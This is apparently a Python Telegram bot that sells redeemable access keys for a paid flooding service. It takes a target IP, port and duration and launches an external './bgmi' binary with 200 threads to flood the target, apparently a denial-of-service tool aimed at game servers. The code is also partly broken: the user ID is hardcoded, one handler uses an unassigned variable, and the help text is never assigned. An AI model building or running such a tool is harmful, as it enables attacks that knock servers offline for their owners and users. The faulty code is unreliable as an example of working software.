import subprocess
import json
import os
import random
import string
import datetime
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from config import BOT_TOKEN, ADMIN_IDS, OWNER_USERNAME



KEY_FILE = "keys.json"

flooding_process = None

flooding_command = None

DEFAULT_THREADS = 200

keys = {}

def load_data():

    global  keys

    keys = load_keys()

def load_keys():
    try:
        with open(KEY_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}
    except Exception as e:
        print(f"Error loading keys: {e}")
        return {}
def save_keys():

    with open(KEY_FILE, "w") as file:

        json.dump(keys, file)

def generate_key(length=6):

    characters = string.ascii_letters + string.digits

    return ''.join(random.choice(characters) for _ in range(length))

def add_time_to_current_date(hours=0, days=0):

    return (datetime.datetime.now() + datetime.timedelta(hours=hours, days=days)).strftime('%Y-%m-%d %H:%M:%S')

# Command to generate keys

async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:

    user_id = str(6197634543)
    if user_id in ADMIN_IDS:

        command = context.args

        if len(command) == 2:

            try:

                time_amount = int(command[0])

                time_unit = command[1].lower()
                if time_unit == 'days':
                    expiration_date = add_time_to_current_date(days=time_amount)
                else:
                    raise ValueError("Invalid time unit")
                key = generate_key()
                keys[key] = expiration_date
                save_keys()
                response = f"Key generated: {key}\nExpires on: {expiration_date}"
            except ValueError:
                response = f"Please specify a valid number and unit of time (hours/days) script by OWNER- @{OWNER_USERNAME}..."
        else:

            response = "Usage: /genkey <amount> <hours/days>"
    else:
        response = f"ONLY OWNER CAN USE💀OWNER OWNER- @{OWNER_USERNAME}..."
    await update.message.reply_text(response)
async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:

    user_id = str(6197634543)
    command = context.args

    if len(command) == 1:

        key = command[0]

        if key in keys:

            expiration_date = keys[key]

            del keys[key]

            save_keys()

            response = f"✅Key redeemed successfully! Access granted until: OWNER- @{OWNER_USERNAME}..."

        else:

            response = f"Invalid or expired key buy from OWNER- @{OWNER_USERNAME}..."

    else:

        response = f"Usage: /redeem <key> if you don't  have  buy from  @{OWNER_USERNAME}..."



    await update.message.reply_text(response)

async def allusers(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:

    user_id = str(6197634543)

    if user_id in ADMIN_IDS:

                try:

                    user_info = await context.bot.get_chat(int(user_id))

                    username = user_info.username if user_info.username else f"UserID: {user_id}"

                    response += f"- @{username} (ID: {user_id}) expires on \n"

                except Exception:

                    response += f"- User ID: {user_id} expires on \n"

    else:

        response = f"ONLY OWNER CAN USE.OWNER- @{OWNER_USERNAME}..."

    await update.message.reply_text(response)

async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:

    global flooding_command

    user_id = str(6197634543)

    if len(context.args) != 3:

        await update.message.reply_text('Usage: /bgmi <target_ip> <port> <duration>')

        return

    target_ip = context.args[0]

    port = context.args[1]

    duration = context.args[2]

    flooding_command = ['./bgmi', target_ip, port, duration, str(DEFAULT_THREADS)]

    await update.message.reply_text(f'Flooding parameters set: {target_ip}:{port} for {duration} seconds with {DEFAULT_THREADS} threads.')

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:

    global flooding_process, flooding_command

    user_id = str(6197634543)

    if flooding_process is not None:

        await update.message.reply_text('Flooding is already running.')

        return

    if flooding_command is None:

        await update.message.reply_text('No flooding parameters set. Use /bgmi to set parameters.')

        return

    flooding_process = subprocess.Popen(flooding_command)

    await update.message.reply_text('Started flooding.')
    
async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:

    global flooding_process

    user_id = str(6197634543)

    if flooding_process is None:

        await update.message.reply_text('No flooding process is running.')

        return

    flooding_process.terminate()

    flooding_process = None

    await update.message.reply_text('Stopped flooding.')

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:

   

        "Welcome to the Flooding Bot by OWNER- @{OWNER_USERNAME}...! Here are the available commands:\n\n"

        "Admin Commands:\n"

        "/genkey <amount> <hours/days> - Generate a key with a specified validity period.\n"

        "/allusers - Show all authorized users.\n"

        "/broadcast <message> - Broadcast a message to all authorized users.\n\n"

        "User Commands:\n"

        "/redeem <key> - Redeem a key to gain access.\n"

        "/bgmi <target_ip> <port> <duration> - Set the flooding parameters.\n"

        "/start - Start the flooding process.\n"

        "/stop - Stop the flooding process.\n"

    

    await update.message.reply_text(response)


def main() -> None:

    application = ApplicationBuilder().token(BOT_TOKEN).build()



    application.add_handler(CommandHandler("genkey", genkey))

    application.add_handler(CommandHandler("redeem", redeem))

    application.add_handler(CommandHandler("allusers", allusers))

    application.add_handler(CommandHandler("bgmi", bgmi))

    application.add_handler(CommandHandler("start", start))

    application.add_handler(CommandHandler("stop", stop))

    application.add_handler(CommandHandler("help", help_command))



    load_data()

    application.run_polling()



if __name__ == '__main__':

    main()
#saurabh lungare
